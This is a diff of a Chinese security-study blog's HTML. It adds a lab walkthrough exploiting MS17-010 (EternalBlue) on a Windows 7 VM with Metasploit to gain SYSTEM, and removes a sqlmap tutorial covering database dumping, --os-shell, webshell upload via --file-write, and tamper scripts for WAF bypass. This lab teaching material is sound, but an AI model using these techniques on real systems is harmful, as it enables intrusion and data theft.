+<figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">查看当前用户</span><br>getuid<br><span class="hljs-meta">#</span><span class="bash">进入shell</span><br>shell<br><span class="hljs-meta">#</span><span class="bash">解决shell乱码</span><br>chcp 65001<br><span class="hljs-meta">#</span><span class="bash">推出shell</span><br>exit<br><span class="hljs-meta">#</span><span class="bash">把会话放到后台</span><br>background<br><span class="hljs-meta">#</span><span class="bash">查看会话</span><br>sessions<br><span class="hljs-meta">#</span><span class="bash">进入某个会话</span><br>session -i id号<br><span class="hljs-meta">#</span><span class="bash">删除会话</span><br>session -k id号<br></code></pre></td></tr></table></figure>
+
+<h2 id="ms17-010漏洞复现"><a href="#ms17-010漏洞复现" class="headerlink" title="ms17-010漏洞复现"></a>ms17-010漏洞复现</h2><h3 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h3><p>永恒之蓝（ms17-010）爆发于2017年4月14日，是一种利用windows系统smb协议漏洞来获取系统最高权限，以此来控制被入侵的计算机。甚至于2017年5月12日不法分子通过改造永恒之蓝制作了wannnacry勒索病毒，使全世界大范围遭受该勒索病毒，该病毒后来被微软修复。存在漏洞的主机只要开放445端口即可被攻击获取系统最高权限。</p>
+<p><strong>影响版本</strong>目前已知受影响的 Windows 版本包括但不限于：WindowsNT，Windows2000、Windows XP、Windows 2003、Windows Vista、Windows 7、Windows 8，Windows 2008、Windows 2008 R2、Windows Server 2012 SP0</p>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>在msf中利用ms17-010漏洞来攻击系统，以初步熟悉msf工具</p>
+<p>复现环境：攻击机为kali 被攻击机为win7 关闭防火墙</p>
+<p>1、主机发现</p>
+<p>在kali中使用nmap扫描win7开放端口<br><code>nmap win7地址 -O操作系统识别 -sS -T4</code><br>下一步需要学习nmap工具的使用<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-18-18.png" alt="扫描发现可以使用" class="lazyload"></p>
+<p>2、永恒之蓝漏洞探测</p>
+<p>先进入msf，然后搜索ms17-010的漏洞模块<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-24-26.png" alt="进入msf搜索漏洞并使用" class="lazyload"></p>
+<p>3、我们使用scanner模块对主机进行扫描，检测是否存在漏洞，<strong>use 1</strong>首先查看模块信息使用info命令查看<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-27-11.png" alt="扫描测试模块" class="lazyload"></p>
+<p>4、如何利用模块对主机扫描，只需要使用show options选项，查看我们需要输入的具体参数，其中表注了yes的选项是必须的参数，若参数为空则需要我们填写，RHOSTS选项为空，所以我们需要填写，代表攻击目标，输入r使用tab补全该参数<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-29-15.png" alt="配置扫描目标" class="lazyload"></p>
+<p>5、使用run执行<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-30-34.png" alt="扫描测试成功可以利用" class="lazyload"></p>
+<p>6、使用攻击模块并重复上述设置<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-30-33.png" alt="查看信息" class="lazyload"><br>7、配置目标<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-35-36.png" alt="配置目标" class="lazyload"><br>8、使用run执行攻击<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-50-23.png" alt="执行" class="lazyload"><br>如果发现攻击失败，这里出现的原因可能是防火墙未关闭，远程连接没有打开，或者是补丁的原因，这里是补丁原因<a target="_blank" rel="noopener" href="https://blog.csdn.net/seachyu/article/details/125364946">参考连接</a><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-15-58-34.png" alt="补丁全部卸载" class="lazyload">把可以卸载的都卸了卸载完成重启<br>重启后再次执行永恒之蓝利用程序测试<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-09-43.png" alt="成功" class="lazyload"><br>可以看到成功获取到了win7的system权限并且可以成功执行命令<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-14-57.png" alt="命令" class="lazyload"><br><strong>注意</strong>：在这里我直接使用攻击模块去攻击的并没有扫描所以才会在攻击那块攻击失败，而扫描是攻击成功后加上去的，正规流程是扫描就会报错然后删除补丁重新扫描成功在利用攻击模块攻击</p>
+<p>9、使用exit可以推出当前shell使用background可以将会话放到msf后台使用sessions可以查看后台shell使用sessions -i id号可以进入相关shell</p>
+<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/04/15/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88ms17-010%EF%BC%89/2023-04-15-16-20-38.png" alt="获取权限" class="lazyload"></p>
+
+            
+        </article>
+    </div>
     
     <div class="nexmoe-post">
         <a href="/2023/04/14/hydra%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">
@@ -281,7 +467,7 @@
 <p>linux文件系统类型ext4、swap交换文件系统，支持的类型有fat16、fat32（单个文件不能超过4G）、ntfs（单个文件不能超过2T）、xfs、jfs、exfat格式支持各种操作系统跨系统</p>
 <p>修改红帽密码按键操作ee2es回车b引导输入passwd修改密码</p>
 <p>linux目录结构：<br>根目录下分很多 bin目录是命令 boot引导分区开机启动项 dev存放存储介质 etc存放配置文件 home普通用户家目录 lib库文件 media、mnt用来挂载存放介质 opt大型应用程序 proc系统开机生成的临时文件 root超级管理员家目录 sbin超级管理员命令 selinux防护体系 srv、sys系统文件 tmp有编译权限 usr存放源代码安装路径 var存放日志或消息或者网站根目录</p>
-<p>#号代表的是管理员 $是普通用户</p>
+<p>井号#号代表的是管理员 $是普通用户</p>
 <p>内部命令安装完系统自带的命令，外部命令安装的应用程序产生的命令<br>短命令一个- 长命令两个- 可以用–help查看帮助<br>uname -r（版本号） -a（详细信息）<br>hostname查看或临时修改计算机名称<br>ifconfig查看ip信息 dhclient加名称 重新获取ip<br>cat /proc/cpuinfo 查看cpu信息<br>cat /proc/meminfo 查看系统内存信息<br>halt 关机<br>reboot 重启<br>pwd 查看当前目录<br>cd 切换目录<br>du 统计目录及文件空间占用情况 -sh统计目录大小<br>ls 产看文件命令 -l查看详细的文件信息 -h查看大小 -a查看隐藏文件</p>
 <hr>
 <p>chmod 更改文件权限 chmod o+x其他人加x chmod g+x给组加x权限 chmod u-x给所有者减x权限 chmod a+x给所有人加x权限 也可以用数字修改权限 r4 w2 x1 值相加 例如chmod 777 xxx<br>chomn修改所有者 -R递归继承</p>
@@ -651,312 +837,6 @@
         </article>
     </div>
     
-    <div class="nexmoe-post">
-        <a href="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/">
-            
-                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
-                    <img data-src="/assets/background.gif" data-sizes="auto" alt="sqlmap使用教程" class="lazyload">
-                    <h1>sqlmap使用教程</h1>
-                </div>
-            
-        </a>
-
-        <div class="nexmoe-post-meta nexmoe-rainbow">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月26日</a>
-            <a><i class="nexmoefont icon-areachart"></i>3.2k 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 14 分钟</a>
-        </div>
-
-        <article>
-            
-                <h2 id="SQLmap简介"><a href="#SQLmap简介" class="headerlink" title="SQLmap简介"></a>SQLmap简介</h2><p>sqlmap是一个开源渗透测试工具，可以用来进行自动化检测，利用sql注入漏洞获取数据库服务器的权限。它具有强大的检测引擎，针对各种不同类型的数据库的渗透测试功能选项，包括获取数据库中存储的数据，访问操作系统文件甚至可以通过外带数据连接方式操作系统命令。<br>它支持五种注入模式：</p>
-<ol>
-<li>基于布尔的盲注，即可以根据返回页面判断条件真假的注入</li>
-<li>基于报错注入，即页面会返回错误信息，或者把注入的语句结果直接返回在页面中</li>
-<li>基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行来判断。</li>
-<li>联合查询注入，可以使用union的情况下的注入。</li>
-<li>对查询注入，可以同时执行多条语句的执行时的注入。</li>
-</ol>
-<p>sqlmap是一个跨屏台的工具，很好用，是sql注入的强大工具。</p>
-<h2 id="sqlmap的安装"><a href="#sqlmap的安装" class="headerlink" title="sqlmap的安装"></a>sqlmap的安装</h2><p>首先它是基于python的首先需要在电脑中安装好python环境然后到sqlmap官网<a target="_blank" rel="noopener" href="http://sqlmap.org/">http://sqlmap.org/</a>下载和python环境相匹配的版本的压缩包，然后解压到python安装的文件下通过命令行启动即可。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-42-27.png" alt="解压位置" class="lazyload"><br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-43-35.png" alt="启动" class="lazyload"></p>
-<h2 id="sqlmap使用参数详解"><a href="#sqlmap使用参数详解" class="headerlink" title="sqlmap使用参数详解"></a>sqlmap使用参数详解</h2><p>在这里我们使用自己虚拟机搭建的sqli-labs靶场作为演示来学习使用sqlmap。<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-14-49-17.png" alt="靶场" class="lazyload"></p>
-<p><strong>选项</strong><br>一些参数选项</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">-h,--help显示本地帮助信息并退出<br>-hh 显示高级帮助信息并退出<br>--version 显示程序版本信息并退出<br>-v 数字 :信息级别：0-6（1缺省），具体含义为<br>    0只显示python错误以及严重的信息<br>    1同时显示基本信息和警告信息（默认）<br>    2同时显示debug信息<br>    3同时显示注入的payload信息<br>    4同时显示http请求<br>    5同时显示http响应头<br>    6同时显示http响应页面<br>    如果想看到sqlmap发送的payload最好的等级为3<br></code></pre></td></tr></table></figure>
-
-<p><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-27-36.png" alt="查看版本新信息" class="lazyload"><br><strong>目标</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">-d direct 直接连接数据库的连接字符串 如：python sqlmap.py -d &quot;mysql://root:root@192.168.23.128:3306/security&quot; 需要有python-pymysql这个库<br><br>-u url ,--url=url 目标url<br>-p 指定注入参数<br>-l logfile 从不让拍或者webscarab代理日志文件中分析目标<br>-x sitemapurl 从远程网站地图sitemap.xml文件来解析<br>-m BULKFILE 将目标地址保存在文件中，一行为一个url地址进行批量检测<br>-r REQUESTFILE 从文件中加载http请求，sqlmap可以从一个文件中获取http请求，这样就可以跳过设置一些其他参数如cookie、post数据等等，请求是https的时需要配合--force-ssl参数来使用，或者可以在host头后加443<br>-g GOOGLEDORK 从谷歌中加载结果目标url（只获取前100个结果，需要魔法）<br>-c configfile 从配置ini文件中加载选项<br></code></pre></td></tr></table></figure>
-
-<p>使用-d尝试连接<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-36-12.png" alt="连接数据库" class="lazyload"></p>
-<p>使用-u参数尝试<br>sqlmap.py -u 选项对于不常使用的网站可以直接使用 -u参数指定url地址探测是否存在注入<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-03-03.png" alt="扫描" class="lazyload"><br>也可以直接添加–batch省区询问直接选择默认项<br>扫描出id存在boolean盲注，并且给出结果mysql版本和服务器类型和php版本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-15-09-41.png" alt="出现boolean盲注" class="lazyload"></p>
-<p>使用-r指定文件从文件中加载目标<br>sqlmap.py -r 文件路径 使用该命令时必须指明文件的绝对路径，验证过程与-u参数类似，判断可注入的参数，判断那种sql注入进行注入<br>可以使用-p参数来指定注入点，使用–skip参数来跳过注入点，也可以使用*来表注注入点，星号添加位置是你认为可能存在的注入点<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-16-54-00.png" alt="数据包" class="lazyload"><br>保存为txt用sqlmap跑<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-16-59-01.png" alt="星号指定注入点" class="lazyload"></p>
-<p><strong>获取信息</strong><br>–current-db获取当前数据库名<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-14-30.png" alt="获取当前数据库名" class="lazyload"><br>–dbs是获取数据库（暴库）<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-02-32.png" alt="获取数据库" class="lazyload"><br>-D指定数据库名 –tables参数是获取数据库中的表(暴表)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-08-58.png" alt="指定库名暴表名" class="lazyload"><br>-T指定表名 –columns参数是获取数据库表中的字段名(暴字段)<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-11-34.png" alt="指定表名暴字段" class="lazyload"><br>-C指定字段名用,分隔 –dump参数获取字段的值<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-17-33-32.png" alt="获取指定字段值" class="lazyload"><br>–start指定开始行 –stop指定结束行指定第几行到第几行的数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-09-23.png" alt="获取指定行数据" class="lazyload"><br>–dump-all获取数据库中所有数据<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-39-02.png" alt="获取所有数据" class="lazyload"></p>
-<p><strong>其他命令</strong><br>level是测试等级一共有五个级别，级别越高检测内容越多，级别大于等于2时会检测cookie是否含有注入，大于等于3时会检测user-angent和referer是否有注入。推荐使用3</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txet">--level 5：探测等级<br><br>探测等级随着等级的变高探测的东西会更更多，不加命令默认探测等级为1，最高为5,。并且随着探测等级越来越高，所需要花费的时间会更多<br><br>--level 共有五个等级，sqlmap使用的payload可以在xml/payloads.xml中看到，自己也可以根据相应的格式添加自己的payload。<br><br>level&gt;=2的时候就会测试HTTP Cookie。<br><br>level&gt;=3的时候就会测试HTTP User-Agent/Referer头。<br><br>level=5 的时候会测试HTTP Host<br><br>为了保证全面性建议使用更高的探测等级进行他探测<br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>–risk=RISK 执行测试的风险（0-3，默认为1）<br>risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试<br>升高风险等级会增加数据被篡改的风险。 常用就是默认1</p>
-<hr>
-<p>os是检测数据库版信息的一个命令，但sqlmap默认会自动检测,–os-shell当数据库为mysql、postgresql或sqlserver时可以通过sqlmap执行操作系统命令</p>
-<p>当数据库是mysql时满足当前用户为root知道网站根目录<br><code>sqlmap -u &quot;xxx&quot; --os-shell</code><br>会让我们选择网站脚本<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-48-42.png" alt="选脚本" class="lazyload"><br>接下来让我们判断网站可写目录的方法<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-50-12.png" alt="可写目录的方法" class="lazyload"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">【1】使用公共的默认目录(C:/xampp/htdocs/，C:/wamp/www，C:/Inetpub/wwwroot/)<br>【2】自定义网络根目录绝对路径<br>【3】指定自定义的路径文件<br>【4】暴力破解<br></code></pre></td></tr></table></figure>
-
-<p>执行os-shell时sqlmap会向网站根目录写入两个文件tmpblwkd.php和tmpueqch.php。真正的木马文件是前者，如果是非正常退出sqlmap的话，这两个文件不会被删除。只有当我们输入x或q退出时sqlmap才会将该文件自动删除<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-19-04-44.png" alt="命令成功执行" class="lazyload"></p>
-<hr>
-<p><em>用来表注注入点：sqlmap可以区分一个url中的参数来进行注入点测试，但在遇到一些做了伪静态的网页就无法自动识别了<br>类似于/admin/1，sqlmap无法进行注入测试，但实际上可能是/admin.php?id=1 只是把参数隐藏在了url中，对于这样只需要在参数后加上一个星号即可如/admin/1</em> 星号之后众生平等</p>
-<hr>
-<p>post数据可以使用–data参数将要提交的数据添加进来就能测试如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; --data=&quot;id=1&amp;admin=2&quot;<br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>cookie可以使用–cookie参数来添加参数如</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; --cookie &#x27;customer=xxxxxxx&#x27;<br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>-g参数会主动爬取google上搜索结果来进行注入，对带有get参数的url进行挨个测试，前提魔法</p>
-<hr>
-<p>超时延迟-timeout 如超时30秒 -timeout 30</p>
-<hr>
-<p>注入测试脚本参数-tamper：sqlmap自带一个脚本库，内置的脚本库对payload进行了混淆，可以绕过一些waf在sqlmap的安装目录tamper下，脚本可以自己编写</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">sqlmap.py -u &quot;url&quot; -tamper &quot;脚本文件&quot;<br></code></pre></td></tr></table></figure>
-
-<p>tamper文件夹下个脚本功能</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs text">space2comment.py用/**/代替空格<br><br>apostrophemask.py用utf8代替引号<br><br>equaltolike.pylike代替等号<br><br>space2dash.py　绕过过滤‘=’ 替换空格字符（”），（’–‘）后跟一个破折号注释，一个随机字符串和一个新行（’n’）<br><br>greatest.py　绕过过滤’&gt;’ ,用GREATEST替换大于号。<br><br>space2hash.py空格替换为#号,随机字符串以及换行符<br><br>apostrophenullencode.py绕过过滤双引号，替换字符和双引号。<br><br>halfversionedmorekeywords.py当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论<br><br>space2morehash.py空格替换为 #号 以及更多随机字符串 换行符<br><br>appendnullbyte.py在有效负荷结束位置加载零字节字符编码<br><br>ifnull2ifisnull.py　绕过对IFNULL过滤,替换类似’IFNULL(A,B)’为’IF(ISNULL(A), B, A)’<br><br>space2mssqlblank.py(mssql)空格替换为其它空符号<br><br>base64encode.py　用base64编码替换<br><br>space2mssqlhash.py　替换空格<br><br>modsecurityversioned.py过滤空格，包含完整的查询版本注释<br><br>space2mysqlblank.py　空格替换其它空白符号(mysql)<br><br>between.py用between替换大于号（&gt;）<br><br>space2mysqldash.py替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）<br><br>multiplespaces.py围绕SQL关键字添加多个空格<br><br>space2plus.py用+替换空格<br><br>bluecoat.py代替空格字符后与一个有效的随机空白字符的SQL语句,然后替换=为like<br><br>nonrecursivereplacement.py双重查询语句,取代SQL关键字<br><br>space2randomblank.py代替空格字符（“”）从一个随机的空白字符可选字符的有效集<br><br>sp_password.py追加sp_password’从DBMS日志的自动模糊处理的有效载荷的末尾<br><br>chardoubleencode.py双url编码(不处理以编码的)<br><br>unionalltounion.py替换UNION ALLSELECT UNION SELECT<br><br>charencode.py　url编码<br><br>randomcase.py随机大小写<br><br>unmagicquotes.py宽字符绕过 GPCaddslashes<br><br>randomcomments.py用/**/分割sql关键字<br><br>charunicodeencode.py字符串 unicode 编码<br><br>securesphere.py追加特制的字符串<br><br>versionedmorekeywords.py注释绕过<br><br>space2comment.py替换空格字符串(‘‘) 使用注释‘/**/’<br><br>halfversionedmorekeywords.py关键字前加注释<br><br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>–current-user当前数据库使用账户<br><img data-fancybox="gallery" data-sizes="auto" data-src="/2023/03/26/sqlmap%E4%BD%BF%E7%94%A8%E6%95%99%E7%A8%8B/2023-03-26-18-05-51.png" alt="查看当前账户" class="lazyload"></p>
-<hr>
-<p>–mobile模拟手机进行测试  –smart智能判断 –passwords -v1对加密的密码尝试进行哈希对撞 –roles可以查看数据管理员的角色<br>–is-dba查看是否是管理员权限</p>
-<hr>
-<p>–file-read当数据库为mysql、postgresql或sqlserver并且当前用户有权限时可以读取指定文件，可以时文本文件或者二进制文件<br>如我们读取目标服务器c盘test.txt<br>sqlmap -u “url” –file-read “文件路径”</p>
-<hr>
-<p>–file-write –file-dest上传文件到数据库服务器中<br>当数据库为mysql、postgresql或sqlserver通过powershell，并且当前用户有权限向任意目录写文件时，可以上传文件到数据库服务器，文件可以是文本，也可以是二进制文件，所以利用文件上传一句话木马或者shell<br>前提我们必须知道服务器的绝对路径：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">python2 sqlmap.py -u http://xxx/sqli-labs/Less-<span class="hljs-number">2</span>/?<span class="hljs-built_in">id</span>=<span class="hljs-number">1</span> <br>--file-write C:\Users\mi\Desktop\<span class="hljs-number">1.</span>php <br>--file-dest <span class="hljs-string">&quot;C:\phpStudy\PHPTutorial\WWW\2.php&quot;</span>  <br><span class="hljs-comment">#将本地的C:\Users\mi\Desktop\1.php文件上传到目标服务器C:\phpStudy\PHPTutorial\WWW\2.php</span><br></code></pre></td></tr></table></figure>
-
-<hr>
-<p>–proxy挂代理：</p>
-<ol>
-<li>直接代理可直接在-u之后直接输入–proxy “代理地址:端口”此时就使用代理访问了</li>
-<li>简介代理：利用burp将sqlmap代理写成监听地址那么sqlmap数据就会通过burp发出这样做可以监听sqlmap发出的请求包能防ip被封。</li>
-</ol>
-<hr>
-<p>–dbms 数据库名 指定数据库名称<br>-level指定等级一般为3<br>-risk指定风险</p>
-<hr>
-<hr>
-<p>必要时需要自己手动写python脚本修改payload语句。<br>在sqlmap中–tamper参数是用来引入用户自定义的脚本来修改注入时的payload，可以使用tamper来绕过waf，替换被过滤的关键字一下是一个基本的tamper结构</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Copyright (c) 2006-2019 sqlmap developers (http://sqlmap.org/)</span><br><span class="hljs-string">See the file &#x27;doc/COPYING&#x27; for copying permission</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br>__priority__ = PRIORITY.LOW <span class="hljs-comment"># 当前脚本调用优先等级</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dependencies</span>():</span> <span class="hljs-comment"># 声明当前脚本适用/不适用的范围，可以为空。</span><br>    <span class="hljs-keyword">pass</span><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span> <span class="hljs-comment"># 用于篡改Payload、以及请求头的主要函数</span><br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
-
-<p>需要把他保存为my.py放入sqlmp/tamper路径下，然后使用时加上参数–tamper=my即可</p>
-<p>import我们可以使用这个关键字导入sqlmap的内部库，sqlmap为我们提供了很多封装好的函数和数据类型如priority源于sqlmap/lib/core/enums.py里边定义了优先级有一下几个参数：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs txt">LOWEST = -100<br>LOWER = -50<br>LOW = -10<br>NORMAL = 0<br>HIGH = 10<br>HIGHER = 50<br>HIGHEST = 100<br></code></pre></td></tr></table></figure>
-
-<p>dependencies主要是提示用户这个tamper支持那些数据库<br>最终要的是tamper函数我们可以把我们想要实现的功能写在这个函数里，这个函数的参数payload就是原始sqlmap的注入payload，我们要实现绕过一般就是要修改这个参数，kwargs是针对http头的修改，如果是修改头部就要使用这个参数。<br>修改payload示例</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span><br>    payload = payload.lower()<br>    payload = payload.replace(<span class="hljs-string">&#x27;select&#x27;</span>,<span class="hljs-string">&#x27;seleselectct&#x27;</span>)<br>    payload = payload.replace(<span class="hljs-string">&#x27;union&#x27;</span>,<span class="hljs-string">&#x27;ununionion&#x27;</span>)<br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
-
-<p>修改http头实例</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Append a fake HTTP header &#x27;X-Forwarded-For&#x27;</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    headers = kwargs.get(<span class="hljs-string">&quot;headers&quot;</span>, &#123;&#125;)<br>    headers[<span class="hljs-string">&quot;X-Forwarded-For&quot;</span>] = randomIP()<br>    headers[<span class="hljs-string">&quot;X-Client-Ip&quot;</span>] = randomIP()<br>    headers[<span class="hljs-string">&quot;X-Real-Ip&quot;</span>] = randomIP()<br>    <span class="hljs-keyword">return</span> payload<br></code></pre></td></tr></table></figure>
-
-<p>在实际的渗透中我们要根据实际情况编写修改tamper中的payload。</p>
-
-            
-        </article>
-    </div>
-    
-    <div class="nexmoe-post">
-        <a href="/2023/03/24/burpsuite%E4%BD%BF%E7%94%A8%E6%96%B9%E6%B3%95/">
-            
-                <div class="nexmoe-post-cover mdui-ripple" style="padding-bottom: 66.66666666666666%;"> 
-                    <img data-src="/assets/background.gif" data-sizes="auto" alt="burpsuite使用方法" class="lazyload">
-                    <h1>burpsuite使用方法</h1>
-                </div>
-            
-        </a>
-
-        <div class="nexmoe-post-meta nexmoe-rainbow">
-            <a><i class="nexmoefont icon-calendar-fill"></i>2023年03月24日</a>
-            <a><i class="nexmoefont icon-areachart"></i>1.6k 字</a>
-            <a><i class="nexmoefont icon-time-circle-fill"></i>大概 6 分钟</a>
-        </div>
-
-        <article>
-            
